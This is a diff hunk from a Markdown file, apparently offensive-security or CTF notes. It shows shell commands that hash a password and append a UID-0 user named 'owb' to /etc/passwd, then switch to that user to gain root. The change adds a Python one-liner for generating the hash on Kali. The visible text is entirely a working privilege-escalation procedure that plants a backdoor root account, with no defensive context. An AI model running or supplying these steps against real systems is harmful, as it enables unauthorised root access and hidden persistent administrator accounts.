@@ -13,6 +13,7 @@ command -v openssl
 
 ```bash
 openssl passwd -6 '<PASSWORD>'
+# or on Kali: python3 -c 'import crypt; print(crypt.crypt("<PASSWORD>", crypt.mksalt(crypt.METHOD_SHA512)))'
 printf 'owb:<HASH>:0:0:root:/root:/bin/bash\n' >> /etc/passwd
 su owb
 id
